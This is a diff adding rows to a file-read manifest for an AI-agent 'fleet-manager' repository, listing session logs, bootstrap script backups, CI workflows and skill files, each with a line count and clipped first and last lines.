+READ	.sessions/2026-07-17-night-snapshot-0717.md	37	full	b10	# Session — night-snapshot-0717	r-regen.yml would keep I6 green without a dedicated session.
+READ	.sessions/2026-07-17-overnight-incidents-0717.md	19	full	b10	# Session — overnight-incidents-0717	 audit it" instinct as this session's landed-vs-opened idea.
+READ	.sessions/2026-07-17-owner-actions-0717.md	17	full	b10	# Session — owner-actions-0717	s digest whenever it detects parked green drafts fleet-wide.
+READ	.sessions/2026-07-17-queue-closeout-0717.md	17	full	b10	# Session — queue-closeout-0717	s items as "waiting on owner" after the owner already acted.
+READ	.sessions/2026-07-18-fm-apparatus-sizing.md	22	full	b10	# Session — fm-apparatus-sizing	tate ↔ owner-queue linkage both fresh and machine-checkable.
+READ	.sessions/2026-07-18-fm-boot-file.md	38	full	b10	# 2026-07-18 · fleet-manager boot file (main-repo migration 	prompt, everyone else via this file.
+READ	.sessions/2026-07-18-fm-capability-heartbeat.md	91	full	b10	# 2026-07-18 · fm capability record + night-watch heartbeat	owner-only work discovered).
+READ	.sessions/2026-07-18-fm-current-state-refresh.md	23	full	b10	# Session — fm-current-state-refresh	hat makes the freshness check trivial rather than heuristic.
+READ	.sessions/2026-07-18-fm-date-capability-walls.md	62	full	b10	# 2026-07-18 · date the undated capability walls (clear S9 a	IT 0 confirms no new capability-denial claim was introduced.
+READ	.sessions/2026-07-18-fm-doctrine-docs-sync.md	63	full	b10	# 2026-07-18 · fleet-manager doctrine docs sync (#308/#309/#	ollow-up since it pulls in #308/#311 bytes I didn't author).
+READ	.sessions/2026-07-18-fm-fleet-doctrine-sweep-record.md	21	full	b10	# Session — fm-fleet-doctrine-sweep-record	al guard correctly; the fleet just needs its hub-level twin.
+READ	.sessions/2026-07-18-fm-meta-restamp-v37.md	91	full	b10	# Session — fm-meta-restamp-v37	it can't silently lag the snapshot axis again.
+READ	.sessions/2026-07-18-fm-no-false-walls-guard.md	124	full	b10	# Session — fm-no-false-walls-guard	o. No filler: this is a real, concrete gap the guard closes.
+READ	.sessions/2026-07-18-fm-overnight-oversight.md	27	full	b11	# Session — fm-overnight-oversight	sely the 💡 idea above, promoted straight out of this review.
+READ	.sessions/2026-07-18-fm-owner-steps-revise.md	68	full	b11	# 2026-07-18 · fleet-manager owner-steps revise to corrected	 in #308/#311 bytes I didn't author — left for a follow-up).
+READ	.sessions/2026-07-18-fm-owner-steps.md	22	full	b11	# Session — fm-owner-steps	hey'd make the queue both self-provenanced and self-ordered.
+READ	.sessions/2026-07-18-fm-remove-winddown-current-state.md	76	full	b11	# Session — fm-remove-winddown-current-state	 This session removed the framing rather than annotating it.
+READ	.sessions/2026-07-18-fm-roster-lapse-note.md	21	full	b11	# Session — fm-roster-lapse-note	e same row — exactly the linkage this incident now provides.
+READ	.sessions/2026-07-18-fm-routine-claims-fence.md	122	full	b11	# 2026-07-18 · fm routine-claims fence (machine-readable hea	e (no new owner-only work discovered); no chat-only residue.
+READ	.sessions/2026-07-18-fm-s3-triage-staleness.md	25	full	b11	# Session — fm-s3-triage-staleness	cal register spelling — a natural companion to this checker.
+READ	.sessions/2026-07-18-fm-sweep-records.md	65	full	b11	# 2026-07-18 · fm sweep records (fleet PR sweep + OQ-GBA re-	stale-claim cleanup candidate.
+READ	.sessions/2026-07-18-fm-verify-routine-state.md	90	full	b11	# 2026-07-18 · fm verify-routine-state (new tool: one-comman	stale-claim cleanup slice, not this PR's scope).
+READ	.sessions/2026-07-18-fm-wake-oversight.md	57	full	b11	# 2026-07-18 · fm wake: triggers-snapshot refresh + oversigh	is aimed at exactly that class.
+READ	.sessions/2026-07-18-fm-websites-custody-snapshot.md	21	full	b11	# Session — fm-websites-custody-snapshot	hich is the strongest evidence the ledger is worth building.
+READ	.sessions/2026-07-18-hub-sweep-record.md	74	full	b11	# 2026-07-18 · hub PR-sweep record reconcile (owner-queue ca	not closed by this session.
+READ	.sessions/2026-07-18-prompt-version-v3.8.md	27	full	b11	# Session — prompt-version-v3.8	 into a red CI run in the same PR that introduces the drift.
+READ	.sessions/2026-07-18-seat-digest-regen.md	72	full	b11	# Session — seat-digest-regen	w doc, or ledger entry created that needs routing elsewhere.
+READ	.sessions/2026-07-18-session-close-ender.md	63	full	b11	# 2026-07-18 · session close ender (closing heartbeat + rout	landed PRs were verified present on `main` before recording.
+READ	.sessions/2026-07-18-startup-prompt-identity-block.md	26	full	b11	# Session — startup-prompt-identity-block	e cause is surfaced at the next wake instead of hours later.
+READ	.sessions/2026-07-18-universal-continue-prompt.md	27	full	b11	# 2026-07-18 · universal "Continue" resume prompt (new regis	hat gap; the control-plane registration follows in websites.
+READ	.sessions/2026-07-18-verified-capabilities.md	36	full	b11	# 2026-07-18 · verified capabilities ledger (evidence-backed	may be written as a wall."
+READ	.sessions/2026-07-19-fm-03z-records.md	102	full	b11	# 2026-07-19 · fm 03:0xZ night-wake records slice (roster gu	deleted in this flip commit.
+READ	.sessions/2026-07-19-fm-06z-morning.md	85	full	b11	# 2026-07-19 · fm ~06:00Z morning-sweep records slice (websi	  commit (claims README step 4).
+READ	.sessions/2026-07-19-fm-06z-snapshot.md	81	full	b11	# 2026-07-19 · fm 06:15Z triggers snapshot + SBW duplicate-f	  commit (claims README step 4).
+READ	.sessions/2026-07-19-fm-10z-snapshot.md	161	full	b11	# 2026-07-19 · fm 10Z snapshot refresh + heartbeat + odd-hou	po written; no trigger-MCP calls made; no chat-only residue.
+READ	.sessions/2026-07-19-fm-14z-cycle.md	85	full	b11	# 2026-07-19 · fm 14Z cycle — snapshot, fleet sweep, plannin	  with the flip per the ledger rule.
+READ	.sessions/2026-07-19-fm-18z-cycle.md	97	full	b11	# 2026-07-19 · fm records slice — 18Z cycle: snapshot + queu	  commit (session close rule).
+READ	.sessions/2026-07-19-fm-22z-cycle.md	158	full	b11	# 2026-07-19 · fm 22Z night cycle — snapshot + heartbeat (re	po touched; no trigger-MCP calls made; no chat-only residue.
+READ	.sessions/2026-07-19-fm-adopt-r30.md	81	full	b11	# 2026-07-19 · fm R30 adoption — workflow-PR merges are agen	  per the ledger rule.
+READ	.sessions/2026-07-19-fm-capabilities-linter.md	125	full	b12	# 2026-07-19 · fm build slice — `check_capabilities_grammar.	  this flip commit.
+READ	.sessions/2026-07-19-fm-evening-groom.md	105	full	b12	# 2026-07-19 · fm evening groom — harvest post-14Z 💡 set + b	  commit.
+READ	.sessions/2026-07-19-fm-fence-emitter.md	114	full	b12	# 2026-07-19 · fm build slice — `emit_routine_claims.py` wri	  commit.
+READ	.sessions/2026-07-19-fm-i8-provenance.md	105	full	b12	# 2026-07-19 · fm build slice — seat-provenance-aware I8 rem	  --delete`).
+READ	.sessions/2026-07-19-fm-label-hygiene.md	135	full	b12	# 2026-07-19 · fm build slice — `scripts/check_label_hygiene	  flip commit.
+READ	.sessions/2026-07-19-fm-lane-liveness.md	109	full	b12	# 2026-07-19 · fm build slice — `scripts/check_lane_liveness	  commit.
+READ	.sessions/2026-07-19-fm-morning-records.md	79	full	b12	# 2026-07-19 · fm records slice — owner nothing-stuck direct	  commit (session close rule).
+READ	.sessions/2026-07-19-fm-planning-groom.md	72	full	b12	# 2026-07-19 · fm planning pass — groom night-shift ideas in	  commit (`bootstrap claim fm-planning-groom --delete`).
+READ	.sessions/2026-07-19-fm-r30-check.md	97	full	b12	# 2026-07-19 · fm r30_merge_check.py — workflow-PR pre-merge	  this flip.
+READ	.sessions/2026-07-19-fm-regen-skip-detector.md	102	full	b12	# 2026-07-19 · fm build slice — regen-window skip detector i	  this flip commit.
+READ	.sessions/2026-07-19-fm-roster-cron-resilience.md	69	full	b12	# 2026-07-19 · fm roster-regen cron resilience (second cron 	  --delete`).
+READ	.sessions/2026-07-19-fm-snapshot-00z.md	146	full	b12	# 2026-07-19 · fm 00Z snapshot refresh + heartbeat + triage 	residue.
+READ	.sessions/2026-07-19-fm-volatile-drift.md	117	full	b12	# 2026-07-19 · fm build slice — volatile-field drift check i	  flip commit.
+READ	.sessions/2026-07-19-fm-wake-idle-detector.md	133	full	b12	# 2026-07-19 · fm build slice — wake-without-work detector i	  this flip commit.
+READ	.sessions/2026-07-20-fm-01z-cycle.md	166	full	b12	# 2026-07-20 · fm 01Z night cycle — snapshot + heartbeat (re	po touched; no trigger-MCP calls made; no chat-only residue.
+READ	.sessions/2026-07-20-fm-05z-cycle.md	186	full	b12	# 2026-07-20 · fm 05Z cycle — snapshot + heartbeat (records 	#386 baton.
+READ	.sessions/2026-07-20-fm-1130z-cycle.md	84	full	b12	# 2026-07-20 · fm 11:30Z cycle — snapshot + stall-catch + ki	  do-not-revert).
+READ	.sessions/2026-07-20-fm-1530z-cycle.md	92	full	b12	# 2026-07-20 · fm 15:30Z cycle — snapshot + SI chain-dead an	  findings with verdicts + advisories; do-not-revert).
+READ	.sessions/2026-07-20-fm-declared-idle.md	127	full	b12	# 2026-07-20 · fm build slice — liveness checker honors decl	  revert).
+READ	.sessions/2026-07-20-fm-liveness-ledger.md	189	full	b12	# 2026-07-20 · fm build slice — lane-liveness ledger + trans	  flip commit.
+READ	.sessions/2026-07-20-fm-morning-records.md	98	full	b12	# 2026-07-20 · fm morning — snapshot + kit-wave sweep (recor	  verdicts; do-not-revert).
+READ	.sessions/2026-07-21-fm-0042z-cycle.md	101	full	b12	# 2026-07-21 · fm 00:42Z cycle — night snapshot + deferred f	  findings with verdicts + advisories; do-not-revert).
+READ	.sessions/2026-07-21-fm-0818z-cycle.md	94	full	b12	# 2026-07-21 · fm 08:18Z cycle — morning snapshot + kit-wave	flip (22 records appended by the strict run; do-not-revert).
+READ	.sessions/2026-07-21-fm-16z-cycle.md	93	full	b12	# 2026-07-21 · fm 16Z cycle — afternoon snapshot + kit-wave 	  recorded with their verdicts; do-not-revert).
+READ	.sessions/2026-07-21-fm-final-closer.md	56	full	b12	# 2026-07-21 · fm final-closer — FINAL CLOSER prompt lands i	flip (19 records appended by the strict run; do-not-revert).
+READ	.sessions/2026-07-21-fm-seat-close.md	55	full	b12	# 2026-07-21 · fm seat close — final closeout (hub seat)	  mechanically harvestable (see this card's 💡).
+READ	.sessions/2026-07-23-hub-forge-slice4-handoff.md	81	full	b13	# 2026-07-23 · hub — phone-controller Slice 4 built + staged	```
+READ	.sessions/2026-07-23-hub-forge-slice4-landed.md	42	full	b13	# 2026-07-23 · hub — Slice-4 handoff LANDED same-session; qu	```
+READ	.sessions/2026-07-26-hub-ci-consolidation.md	76	full	b13	# 2026-07-26 · hub — CI consolidation: 97 workflow files mea	```
+READ	.sessions/2026-07-26-hub-consolidation-plan-v2.md	89	full	b13	# 2026-07-26 · hub — plan v2: verification-led consolidation	```
+READ	.sessions/2026-07-26-hub-consolidation-program.md	68	full	b13	# 2026-07-26 · hub — the consolidation program + boot-file r	```
+READ	.sessions/2026-07-26-hub-e1-final-email-plan.md	49	full	b13	# 2026-07-26 · hub — E1 planned: the final EAP email (source	```
+READ	.sessions/2026-07-26-hub-fleet-consolidation-plan.md	75	full	b13	# 2026-07-26 · hub — fleet consolidation plan (product topol	```
+READ	.sessions/2026-07-26-hub-full-corpus-readback.md	78	full	b13	# 2026-07-26 · hub — full-corpus read-back: the fleet accoun	```
+READ	.sessions/2026-07-26-hub-od10-12-mail-layer.md	57	full	b13	# 2026-07-26 · hub — OD-10/11/12 recorded; the mail layer re	```
+READ	.sessions/2026-07-31-false-github-api-wall.md	145	full	b13	# 2026-07-31 · Correct the false `api.github.com` wall — and	ied upon are exactly the ones whose staleness costs nothing.
+READ	.sessions/2026-08-01-e1-owner-reserved.md	85	full	b13	# E1 is owner-reserved, not stalled — annotate the NOW point	** opus-5 · high · docs-only — annotate E1 as owner-reserved
+READ	.sessions/2026-08-03-hub-gemini-video-qa-gem.md	125	full	b13	# 2026-08-03 · hub — Gemini visual-QA Gem: tier research, ve	-walls guard `CLEAN`; share read returned 70 426 characters.
+READ	.sessions/2026-08-03-hub-gh-is-not-a-wall.md	104	full	b13	# 2026-08-03 · hub — `gh` was never a wall: install it fleet	designed hold before the flip; false-walls guard `CLEAN`.
+READ	.sessions/2026-08-03-hub-pat-is-environment-scoped.md	51	full	b13	# 2026-08-03 · hub — the direct-PAT recipe assumed a variabl	```
+READ	.sessions/2026-08-03-hub-provider-references.md	94	full	b13	# 2026-08-03 · hub — per-provider capability references: Cla	```
+READ	.sessions/2026-08-03-hub-surfaces-and-prompt-skills.md	116	full	b13	# 2026-08-03 · hub — execution surfaces documented, kit skil	ath that existed only in another repo); false-walls `CLEAN`.
+READ	.sessions/2026-08-04-hub-art-finding-corrections.md	78	full	b13	# 2026-08-04 · hub — correcting the art finding: decompositi	```
+READ	.sessions/2026-08-04-hub-art-pipeline-archaeology.md	81	full	b13	# 2026-08-04 · hub — how spider-swing's art got consistent: 	```
+READ	.sessions/2026-08-04-hub-chroma-spill-measured.md	87	full	b13	# 2026-08-04 · hub — measuring the chroma claim instead of q	```
+READ	.sessions/2026-08-04-hub-final-three-skills.md	74	full	b13	# 2026-08-04 · hub — audio-prompt, capability-probe, owner-b	```
+READ	.sessions/2026-08-04-hub-image-generation-comparison.md	71	full	b13	# 2026-08-04 · hub — four-surface image-generation compariso	```
+READ	.sessions/2026-08-04-hub-inhabiting-vs-observing.md	78	full	b13	# 2026-08-04 · hub — inhabiting vs observing: minting PL-013	```
+READ	.sessions/2026-08-04-hub-provider-capability-reference.md	99	full	b13	# 2026-08-04 · hub — provider references at model granularit	```
+READ	.sessions/2026-08-04-hub-provider-docs-accuracy-pass.md	115	full	b13	# 2026-08-04 · hub — provider docs were thin: accuracy pass 	```
+READ	.sessions/2026-08-04-hub-provider-refs-deep-research-review.md	81	full	b13	# 2026-08-04 · hub — reviewing an external Deep Research rep	```
+READ	.sessions/2026-08-04-hub-skill-family-and-audit.md	100	full	b13	# 2026-08-04 · hub — fresh-eyes audit + the image-prompt ski	```
+READ	.sessions/2026-08-04-hub-skill-router-and-pipeline.md	76	full	b14	# 2026-08-04 · hub — the skill router, the pipeline skill, a	```
+READ	.sessions/2026-08-04-hub-structure-converges-models.md	77	full	b14	# 2026-08-04 · hub — structure converges the models: the ski	```
+READ	.sessions/2026-08-05-aistudio-billing-caveat.md	57	full	b14	# 2026-08-05 · hub — the paid-key caveat on AI Studio's free	```
+READ	.sessions/2026-08-05-calibration-and-602.md	123	full	b14	# 2026-08-05 · hub — the calibration evidence, and the PR th	notice it. The instruments were never the gap.
+READ	.sessions/2026-08-05-control-veto-ratified.md	59	full	b14	# 2026-08-05 · hub — the control/ resolution, owner-ratified	```
+READ	.sessions/2026-08-05-delegation-and-surface-notes.md	101	full	b14	# 2026-08-05 · hub — record two measurements the provider do	 reads it and ignores it, which is exactly today's baseline.
+READ	.sessions/2026-08-05-discord-test-server-and-bot-value.md	88	full	b14	# 2026-08-05 · hub — what a playtest Discord needs, and whic	same gap both times.
+READ	.sessions/2026-08-05-doc-routing-hook.md	181	full	b14	# 2026-08-05 · hub — a mechanism instead of a fourth rule	next hour.
+READ	.sessions/2026-08-05-foundation-continuation.md	96	full	b14	# 2026-08-05 · hub — review the session with Gemini, and set	property every stale claim in this estate has lacked.
+READ	.sessions/2026-08-05-gemini-delegation.md	81	full	b14	# 2026-08-05 · hub — delegated reads to Gemini, with a citat	```
+READ	.sessions/2026-08-05-gemini-paid-tier-live.md	64	full	b14	# 2026-08-05 · hub — Gemini paid tier live, and two standing	```
+READ	.sessions/2026-08-05-gemini-quotas-and-interactions.md	79	full	b14	# 2026-08-05 · hub — the real Gemini quotas, and a correctio	```
+READ	.sessions/2026-08-05-gemini-retrieval-not-reading.md	76	full	b14	# 2026-08-05 · hub — it was retrieval, not reading	these hosts and these questions.
+READ	.sessions/2026-08-05-gemini-surface-probe.md	72	full	b14	# 2026-08-05 · hub — what the Gemini API actually offers, pr	```
+READ	.sessions/2026-08-05-handoff-fidelity-and-boot-path.md	120	full	b14	# 2026-08-05 · hub — fix the boot path and the handoff skill	nd unlike a file list it cannot go stale when the docs move.
+READ	.sessions/2026-08-05-hud-telemetry-verification.md	74	full	b14	# 2026-08-05 · hub — the HUD was the instrument	```
+READ	.sessions/2026-08-05-interactions-api-correction.md	134	full	b14	# 2026-08-05 · hub — repudiate a false wall I wrote three ho	measured before you measure it again.**
+READ	.sessions/2026-08-05-name-decided-queue-sync.md	53	full	b14	# 2026-08-05 · hub — sync the queue to the decided name	remains the only open item on the name.
+READ	.sessions/2026-08-05-navigation-graph-correction.md	83	full	b14	# 2026-08-05 · hub — correct the menu-parity claim: the navi	angerous than an admitted unknown: it terminates the search.
+READ	.sessions/2026-08-05-owner-provisioning-claims.md	113	full	b14	# 2026-08-05 · hub — the owner's provisioning claims are pri	worked all day.
+READ	.sessions/2026-08-05-play-closed-test-and-gemini-benchmark.md	100	full	b14	# 2026-08-05 · hub — the tool decided, not the model	d, and `android-release.yml` still has never run end to end.
+READ	.sessions/2026-08-05-play-submission-requirements.md	89	full	b14	# 2026-08-05 · hub — what Google Play actually requires	 a session, since it needs the owner's repository variables.
+READ	.sessions/2026-08-05-presence-model.md	80	full	b14	# 2026-08-05 · hub — what the eight catches were actually ma	of it.
+READ	.sessions/2026-08-05-studio-api-asymmetry.md	65	full	b14	# 2026-08-05 · hub — the Studio/API asymmetry, and who shoul	```
+READ	.sessions/2026-08-05-superbot-next-live-audit.md	88	full	b14	# 2026-08-05 · hub — boot superbot-next and measure what the	and see whether anything happens.
+READ	.sessions/2026-08-05-tester-admission-verified.md	74	full	b14	# 2026-08-05 · hub — settle how Play testers are actually ad	still unhosted, and trademark clearance is untouched.
+READ	.sessions/2026-08-05-three-repo-state-audit.md	129	full	b15	# 2026-08-05 · hub — establish what is actually true across 	ys 43 hand-written methods for, the manifest would get once.
+READ	.sessions/2026-08-05-vertex-first-directive.md	101	full	b15	# 2026-08-05 · hub — the credit was there the whole time	than silently revert.
+READ	.sessions/2026-08-05-vertex-live.md	68	full	b15	# 2026-08-05 · hub — Vertex AI reachable from a session	```
+READ	.sessions/2026-08-05-video-generation-pipeline.md	82	full	b15	# 2026-08-05 · hub — video generation, end to end	```
+READ	.sessions/2026-08-05-walls-refuted.md	89	full	b15	# 2026-08-05 · hub — refute three "verified walls" with one 	**knew how to find out** and had no way to make that happen.
+READ	.sessions/2026-08-06-broke-main-and-wired-the-gate.md	114	full	b15	# 2026-08-06 · hub — I broke main, the gate that would have 	the gap eight days earlier.
+READ	.sessions/2026-08-06-codex-holed-my-gate.md	108	full	b15	# 2026-08-06 · hub — Codex found the logic hole in my own lo	the first time it has been demonstrated against my own work.
+READ	.sessions/2026-08-06-codex-rung-evidence.md	86	full	b15	# 2026-08-06 · hub — the Codex rung got tested, and it holds	inherited.
+READ	.sessions/2026-08-06-foundation-verification.md	73	full	b15	# 2026-08-06 · Verify the foundation — classify the kit's ch	  session did not run an upgrade wave.
+READ	.sessions/2026-08-06-free-on-cost-global-in-scope.md	104	full	b15	# 2026-08-06 · hub — "free" was true on cost and false on sc	demonstrated three times running against its own author.
+READ	.sessions/2026-08-06-growth-is-the-measurement.md	107	full	b15	# 2026-08-06 · hub — the doc doubling is the finding, not th	was written down.
+READ	.sessions/2026-08-06-restate-in-the-prompt.md	95	full	b15	# 2026-08-06 · hub — the restate requirement moves into the 	and already in the repo.
+READ	.sessions/2026-08-06-review-ladder.md	99	full	b15	# 2026-08-06 · hub — the review ladder, run through itself b	fifth becoming the sixth.
+READ	.sessions/2026-08-06-round-five-falsified-me.md	90	full	b15	# 2026-08-06 · hub — round 5 falsified my prediction, and my	prediction leaves this session.
+READ	.sessions/2026-08-06-screen-recording-sampling.md	109	full	b15	# 2026-08-06 · hub — video is readable; the question is how 	same shape as the placement failures, one level down.
+READ	.sessions/2026-08-06-sweep-telemetry.md	53	full	b15	# 2026-08-06 · hub — telemetry delta from the 12-repo gate-p	fixed — the ledger still cannot say which build wrote a row.
+READ	.sessions/2026-08-06-three-gemini-paths.md	112	full	b15	# 2026-08-06 · hub — a free key hidden behind a paid one, an	lost a distinction on the way to the page that gets read.**
+READ	.sessions/2026-08-06-use-versus-mention.md	118	full	b15	# 2026-08-06 · hub — the false positive that keeps improving	; this checker felt like noise and measured ambiguous prose.
+READ	.sessions/2026-08-07-boot-source-and-ledger-corrections.md	123	full	b15	# 2026-08-07 · hub — the boot source decides how capable a s	next.
+READ	.sessions/2026-08-07-codex-caught-four.md	92	full	b15	# 2026-08-07 · hub — I asked for a review and merged before 	se "150 seconds" comment on #812 is corrected in the thread.
+READ	.sessions/2026-08-07-curious-research-handover.md	97	full	b15	# 2026-08-07 · hub — the gift repo stopped being a seat and 	n the owner's introduction email with a Claude subscription.
+READ	.sessions/2026-08-07-retire-the-roster.md	103	full	b15	# 2026-08-07 · hub — the roster is retired, and it had alrea	  actually wiped. This session did not check.
+READ	.sessions/2026-08-07-substrate-measured.md	60	full	b15	# 2026-08-07 · hub — counting what the substrate caught	docs/current-state.md`, top item the Fusion→laser/CNC guide.
+READ	.sessions/2026-08-08-index-layer2-spider-swing.md	302	full	b15	# 2026-08-08 · hub — Layer 2's first folder, built once so t	in the folder; both are one commit away if the answer is no.
+READ	.sessions/2026-08-08-layer2-ratification.md	295	full	b15	# 2026-08-08 · hub — Layer-2 ratification, and the flip-befo	  content survived the restart.
+READ	.sessions/2026-08-08-owner-intent-capture.md	135	full	b15	# 2026-08-08 · hub — the owner's intent, asked and captured	eliberately does not require a file of that name everywhere.
+READ	.sessions/2026-08-08-rules-enforcement-phase1.md	170	full	b16	# 2026-08-08 · hub — Phase 1: make the corpus trustworthy en	  channel this session argues must stay quiet.
+READ	.sessions/2026-08-09-error-to-mechanism.md	199	full	b16	# 2026-08-09 · hub — turn the error ledger into mechanisms t	re-applied afterwards, which is the P1 turned into a guard.
+READ	.sessions/2026-08-09-false-wall-review-and-negation-scope.md	163	full	b16	# 2026-08-09 · hub — independently review the day's guards, 	  verified in CI, final flip is the only remaining commit.
+READ	.sessions/2026-08-09-intent-architecture-phase-2.md	332	full	b16	# 2026-08-09 · hub — review the intent-architecture thread, 	claim somewhere I did not grep.
+READ	.sessions/2026-08-09-kit-upgrade-eap-reconciliation.md	472	full	b16	# 2026-08-09 · hub — the kit upgrade's payload question, set	 **E1 itself** — still owner-reserved and now fully sourced.
+READ	.sessions/2026-08-09-trigger-tools-guard.md	75	full	b16	# 2026-08-09 · hub — stop sessions stalling the owner with t	`](../docs/findings/2026-08-09-independent-guard-review.md).
+READ	.sessions/2026-08-10-d2-fleet-manager-truth-pass.md	153	full	b16	# 2026-08-10 · hub — D2 fleet-manager truth pass	reviewed completion flip, then verified from merged `main`.
+READ	.sessions/2026-08-10-verify-fm835-and-chatgpt-surface.md	113	full	b16	# 2026-08-10 · hub — verify fm #835 independently, then reco	n after the flip; probed against the tree, not a stale read.
+READ	.sessions/README.md	10	full	b16	# Session logs	ever record a full dated model ID — family-level names only.
+READ	.substrate/agents/architect.md	18	full	b16	---	opose the compliant placement. You advise — you do not edit.
+READ	.substrate/agents/researcher.md	14	full	b16	---	 source over assuming. You produce understanding, not edits.
+READ	.substrate/agents/reviewer.md	17	full	b16	---	seam: a *different* model reviewing breaks the monoculture.)
+READ	.substrate/backup/bootstrap-1.10.0.py	14678	structural	b17	"""substrate-kit bootstrap v1.10.0 — GENERATED, DO NOT EDIT.	    raise SystemExit(main())
+READ	.substrate/backup/bootstrap-1.10.1.py	14734	structural	b17	"""substrate-kit bootstrap v1.10.1 — GENERATED, DO NOT EDIT.	    raise SystemExit(main())
+READ	.substrate/backup/bootstrap-1.11.0.py	14962	structural	b17	"""substrate-kit bootstrap v1.11.0 — GENERATED, DO NOT EDIT.	    raise SystemExit(main())
+READ	.substrate/backup/bootstrap-1.12.0.py	15288	structural	b17	"""substrate-kit bootstrap v1.12.0 — GENERATED, DO NOT EDIT.	    raise SystemExit(main())
+READ	.substrate/backup/bootstrap-1.12.1.py	15579	structural	b18	"""substrate-kit bootstrap v1.12.1 — GENERATED, DO NOT EDIT.	    raise SystemExit(main())
+READ	.substrate/backup/bootstrap-1.13.0.py	16210	structural	b18	"""substrate-kit bootstrap v1.13.0 — GENERATED, DO NOT EDIT.	    raise SystemExit(main())
+READ	.substrate/backup/bootstrap-1.14.0.py	16983	structural	b18	"""substrate-kit bootstrap v1.14.0 — GENERATED, DO NOT EDIT.	    raise SystemExit(main())
+READ	.substrate/backup/bootstrap-1.15.0.py	17855	structural	b18	"""substrate-kit bootstrap v1.15.0 — GENERATED, DO NOT EDIT.	    raise SystemExit(main())
+READ	.substrate/backup/bootstrap-1.16.0.py	20954	structural	b19	"""substrate-kit bootstrap v1.16.0 — GENERATED, DO NOT EDIT.	    raise SystemExit(main())
+READ	.substrate/backup/bootstrap-1.17.0.py	21274	structural	b19	"""substrate-kit bootstrap v1.17.0 — GENERATED, DO NOT EDIT.	    raise SystemExit(main())
+READ	.substrate/backup/bootstrap-1.20.1.py	27948	structural	b19	"""substrate-kit bootstrap v1.20.1 — GENERATED, DO NOT EDIT.	    raise SystemExit(main())
+READ	.substrate/backup/bootstrap-1.4.0.py	10618	structural	b19	"""substrate-kit bootstrap v1.4.0 — GENERATED, DO NOT EDIT.	    raise SystemExit(main())
+READ	.substrate/backup/bootstrap-1.7.0.py	12012	structural	b20	"""substrate-kit bootstrap v1.7.0 — GENERATED, DO NOT EDIT.	    raise SystemExit(main())
+READ	.substrate/backup/bootstrap-1.7.1.py	12893	structural	b20	"""substrate-kit bootstrap v1.7.1 — GENERATED, DO NOT EDIT.	    raise SystemExit(main())
+READ	.substrate/backup/bootstrap-1.8.0.py	13942	structural	b20	"""substrate-kit bootstrap v1.8.0 — GENERATED, DO NOT EDIT.	    raise SystemExit(main())
+READ	.substrate/backup/bootstrap-1.9.0.py	14371	structural	b20	"""substrate-kit bootstrap v1.9.0 — GENERATED, DO NOT EDIT.	    raise SystemExit(main())
+READ	.substrate/backup/last-upgrade.json	7	full	b21	{	}
+READ	.substrate/backup/state.json	157	full	b21	{	}
+READ	.substrate/backup/substrate-gate.pre-regen-4f50eb4d.yml	169	full	b21	# substrate-kit enforcement gate (LIVE — installed by `boots	          exit "$fail"
+READ	.substrate/backup/substrate-gate.pre-regen-936a5584.yml	202	full	b21	# substrate-kit enforcement gate (LIVE — installed by `boots	          exit "$fail"
+READ	.substrate/check-exceptions.yml	75	full	b21	# one entry per accepted finding — reason is REQUIRED	  verdict: false_positive
+READ	.substrate/ci/auto-merge-enabler.yml	98	full	b21	# substrate-kit auto-merge enabler (LIVE — installed by	          fi
+READ	.substrate/ci/branch-sweep.yml	130	full	b21	# substrate-kit branch sweep (LIVE — installed by	          done < sweep-plan.txt
+READ	.substrate/ci/quality.yml.example	32	full	b21	# Example GitHub-Actions-style quality gate for a substrate-	#         run: python3 bootstrap.py check --strict
+READ	.substrate/ci/substrate-gate.yml	244	full	b21	# substrate-kit enforcement gate (LIVE — installed by `boots	          python3 bootstrap.py check --strict
+READ	.substrate/claude/CLAUDE.md	65	full	b21	# fleet-manager — agent working agreement	urrent adoption pace for the substrate workflow: **guided**.
+READ	.substrate/episodic_index.json	18	full	b21	[	]
+READ	.substrate/guard-fires.jsonl	9811	structural	b22	{"cmd": "check", "finding": {"kind": "badge", "message": "in	s": "2026-08-10T19:24:04+00:00", "verdict": "accepted_risk"}
+READ	.substrate/hooks/README.md	19	full	b23	# Hook settings — customization contract	never block a tool, an edit, or a session stop.
+READ	.substrate/hooks/settings.template.json	46	full	b23	{	}
+READ	.substrate/skills/analysis/SKILL.md	14	full	b23	---	Declared capabilities: read-only.
+READ	.substrate/skills/chase-references/SKILL.md	62	full	b23	---	Declared capabilities: read-only.
+READ	.substrate/skills/deep-research/SKILL.md	16	full	b23	---	Declared capabilities: run.
+READ	.substrate/skills/intake/SKILL.md	70	full	b23	---	red capabilities: read (the index, the ledger, the profile).
+READ	.substrate/skills/prep-owner-steps/SKILL.md	71	full	b23	---	own capabilities do any writing).
+READ	.substrate/skills/quality-gate/SKILL.md	15	full	b23	---	Declared capabilities: run.
+READ	.substrate/skills/question/SKILL.md	14	full	b23	---	Declared capabilities: read-only.
+READ	.substrate/skills/rationalize/SKILL.md	58	full	b23	---	own capabilities do any shipping).
+READ	.substrate/skills/release/SKILL.md	77	full	b23	---	git + gh).
+READ	.substrate/skills/repo-health/SKILL.md	15	full	b23	---	Declared capabilities: run.
+READ	.substrate/skills/review/SKILL.md	16	full	b23	---	Declared capabilities: comment.
+READ	.substrate/skills/scope-backlog-item/SKILL.md	76	full	b23	---	s: read (the origin refs, the backlog, the docs-gate rules).
+READ	.substrate/skills/session-close/SKILL.md	67	full	b23	---	capabilities: edit (the log + docs), run (the checks + git).
+READ	.substrate/skills/upgrade-distribution/SKILL.md	67	full	b23	---	checks).
+READ	.substrate/state.json	157	full	b23	{	}
+READ	.substrate/upgrade-report.md	75	full	b23	# substrate-kit upgrade report — v1.20.1 → v1.20.2	```
+READ	CONSTITUTION.md	154	full	b23	# fleet-manager — constitution	[D-NNNN]. Keep the whole hand-filled file under 150 lines.)
+READ	MISSION.md	48	full	b23	# fleet-manager · MISSION	undefined (blueprint §2 delta 8).
+READ	README.md	60	full	b23	# fleet-manager — the estate router and records home	repository state win over every document.
+READ	bootstrap.py	28325	structural	b24	"""substrate-kit bootstrap v1.20.2 — GENERATED, DO NOT EDIT.	    raise SystemExit(main())
+READ	control/README.md	79	full	b25	> **RETIRED 2026-07-17 — autonomous apparatus wound down; hi	working session).
+READ	control/claims/README.md	85	full	b25	# `control/claims/` — claim before build, one file per claim	isn't an ORDER id.
+READ	control/inbox.md	1595	full	b25	# fleet-manager · inbox	 historical and no new ORDER blocks are appended after #049.
+READ	control/outbox.md	810	full	b25	> **RETIRED 2026-07-17 — autonomous apparatus wound down; hi	st lane — coordinator may add the row on its next docs pass.
